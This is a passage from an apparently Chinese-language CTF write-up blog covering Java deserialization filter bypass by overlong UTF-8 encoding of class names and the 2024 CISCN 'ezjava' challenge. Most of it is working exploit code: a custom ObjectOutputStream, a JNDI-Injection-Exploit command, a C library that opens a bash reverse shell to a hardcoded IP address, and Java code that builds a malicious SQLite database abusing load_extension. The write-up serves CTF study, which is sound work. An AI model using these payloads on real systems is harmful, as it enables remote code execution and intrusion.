        } catch (IOException e) {    
            throw new RuntimeException(e);    
        }    
    
    }    
    public void charWriteThreeBytes(String name){    
        //将name进行overlong Encoding    
        byte[] bytes=new byte[name.length() * 3];    
        int k=0;    
        StringBuffer str=new StringBuffer();    
        for (int i = 0; i &lt; name.length(); i&#43;&#43;) {    
            int[] bs = bytesMap.get(name.charAt(i));    
            bytes[k&#43;&#43;]= (byte) bs[0];    
            bytes[k&#43;&#43;]= (byte) bs[1];    
            bytes[k&#43;&#43;]= (byte) bs[2];    
            str.append(Integer.toHexString(bs[0])&#43;&#34;,&#34;);    
            str.append(Integer.toHexString(bs[1])&#43;&#34;,&#34;);    
            str.append(Integer.toHexString(bs[2])&#43;&#34;,&#34;);    
        }    
        System.out.println(str.toString());    
        try {    
            writeShort(name.length() * 3);    
            write(bytes);    
        } catch (IOException e) {    
            throw new RuntimeException(e);    
        }    
    }    
    
    
    protected void writeClassDescriptor(ObjectStreamClass desc)    
            throws IOException {    
        String name = desc.getName();    
        boolean externalizable = (boolean) getFieldValue(desc, &#34;externalizable&#34;);    
        boolean serializable = (boolean) getFieldValue(desc, &#34;serializable&#34;);    
        boolean hasWriteObjectData = (boolean) getFieldValue(desc, &#34;hasWriteObjectData&#34;);    
        boolean isEnum = (boolean) getFieldValue(desc, &#34;isEnum&#34;);    
        ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc, &#34;fields&#34;);    
        System.out.println(name);    
        //写入name（jdk原生写入方法）    
//        writeUTF(name);    
        //写入name(两个字节表示一个字符)    
        charWritTwoBytes(name);    
        //写入name(三个字节表示一个字符)    
//        charWriteThreeBytes(name);    
    
    
        writeLong(desc.getSerialVersionUID());    
        byte flags = 0;    
        if (externalizable) {    
            flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;    
            Field protocolField =    
                    null;    
            int protocol;    
            try {    
                protocolField = ObjectOutputStream.class.getDeclaredField(&#34;protocol&#34;);    
                protocolField.setAccessible(true);    
                protocol = (int) protocolField.get(this);    
            } catch (NoSuchFieldException e) {    
                throw new RuntimeException(e);    
            } catch (IllegalAccessException e) {    
                throw new RuntimeException(e);    
            }    
            if (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) {    
                flags |= ObjectStreamConstants.SC_BLOCK_DATA;    
            }    
        } else if (serializable) {    
            flags |= ObjectStreamConstants.SC_SERIALIZABLE;    
        }    
        if (hasWriteObjectData) {    
            flags |= ObjectStreamConstants.SC_WRITE_METHOD;    
        }    
        if (isEnum) {    
            flags |= ObjectStreamConstants.SC_ENUM;    
        }    
        writeByte(flags);    
    
        writeShort(fields.length);    
        for (int i = 0; i &lt; fields.length; i&#43;&#43;) {    
            ObjectStreamField f = fields[i];    
            writeByte(f.getTypeCode());    
            writeUTF(f.getName());    
            if (!f.isPrimitive()) {    
                invoke(this, &#34;writeTypeString&#34;, f.getTypeString());    
            }    
        }    
    }    
    
    public static void invoke(Object object, String methodName, Object... args) {    
        Method writeTypeString = null;    
        try {    
            writeTypeString = ObjectOutputStream.class.getDeclaredMethod(methodName, String.class);    
            writeTypeString.setAccessible(true);    
            try {    
                writeTypeString.invoke(object, args);    
            } catch (IllegalAccessException e) {    
                throw new RuntimeException(e);    
            } catch (InvocationTargetException e) {    
                throw new RuntimeException(e);    
            }    
        } catch (NoSuchMethodException e) {    
            throw new RuntimeException(e);    
        }    
    }    
    
    public static Object getFieldValue(Object object, String fieldName) {    
        Class&lt;?&gt; clazz = object.getClass();    
        Field field = null;    
        Object value = null;    
        try {    
            field = clazz.getDeclaredField(fieldName);    
            field.setAccessible(true);    
            value = field.get(object);    
        } catch (NoSuchFieldException e) {    
            throw new RuntimeException(e);    
        } catch (IllegalAccessException e) {    
            throw new RuntimeException(e);    
        }    
        return value;    
    }    
}  
```  
网上大部分都没有转换数字，这里需要加上  
```java  
map.put(&#39;2&#39;, new int[]{0xc0, 0xb2});    
map.put(&#39;1&#39;, new int[]{0xc0, 0xb1});  
```  
转换脚本用 p 神的  
```python  
def convert_int(i: int) -&gt; bytes:    
    b1 = ((i &gt;&gt; 6) &amp; 0b11111) | 0b11000000    
    b2 = (i &amp; 0b111111) | 0b10000000    
    return bytes([b1, b2])    
    
    
def convert_str(s: str) -&gt; bytes:    
    bs = b&#39;&#39;    
    for ch in s.encode():    
        bs &#43;= convert_int(ch)    
    
    return bs    
    
    
if __name__ == &#39;__main__&#39;:    
    print(convert_str(&#39;1&#39;))    
    #print(convert_str(&#39;org.example.Evil&#39;)) # b&#39;\xc1\xaf\xc1\xb2\xc1\xa7\xc0\xae\xc1\xa5\xc1\xb8\xc1\xa1\xc1\xad\xc1\xb0\xc1\xac\xc1\xa5\xc0\xae\xc1\x85\xc1\xb6\xc1\xa9\xc1\xac&#39;  
```  
运行`JNDI`  
```java  
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &#34;touch /tmp/pwned&#34; -A &#34;127.0.0.1&#34;  
```  
攻击成功  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202412091702041.png)
# 2024 CISCN ezjava  
## 0x01 解题记录  
`/connect`路由存在 JDBC 连接，很明显是直接打 JDBC  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501021902937.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501021903345.png)
这里只能通过 JDBC Attack Sqlite 来达到 RCE 的目的  
https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf  
并且在这里还执行了一条语句  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501021907660.png)
所以思路很清晰，直接通过写入文件打 RCE  
按照文章中的思路构造`payload`  
exp.so  
```c  
#include &lt;stdio.h&gt;  
#include &lt;unistd.h&gt;  
#include &lt;stdlib.h&gt;  
   
void exp() {{  
    system(&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/8.137.71.171/1234 &lt;&amp;1&#39;&#34;);  
}}  
   
void space() {{  
    static char waste[500 * 1024] = {{2}};  
}}  
```  
exp.db  
```java  
package org.example;  
   
import java.io.File;  
import java.sql.Connection;  
import java.sql.DriverManager;  
import java.sql.PreparedStatement;  
   
public class Main {  
    public static void main(String[] args) {  
        try {  
            String dbFile = &#34;poc.db&#34;;  
            File file = new File(dbFile);  
            Class.forName(&#34;org.sqlite.JDBC&#34;);  
            Connection conn = DriverManager.getConnection(&#34;jdbc:sqlite:&#34;&#43;dbFile);  
   
            System.out.println(&#34;Opened database successfully&#34;);  
            String sql = &#34;CREATE VIEW security as SELECT (SELECT load_extension(&#39;/tmp/sqlite-jdbc-tmp-1915187336.db&#39;,&#39;exp&#39;));&#34;;  //向其中插⼊传⼊的三个参数  
            PreparedStatement preStmt = conn.prepareStatement(sql);  
            preStmt.executeUpdate();  
            preStmt.close();  
            conn.close();  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
}  
```  
利用`CREATE VIEW`来劫持 select 语句  
文件名  
```java  
package org.example;  
   
import java.net.URL;  
   
public class App {  
    public static void main(String[] args) throws Exception{  
        String url = &#34;http://ip:8089/exp.so&#34;;  
        Integer hash = new URL(url).hashCode();  
        String dbFileName = String.format(&#34;sqlite-jdbc-tmp-%d.db&#34;, Integer.valueOf(hash));  
        System.out.println(dbFileName);  
    }  
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501021920383.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501021922498.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501021921846.png)
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/java-ctf3/  

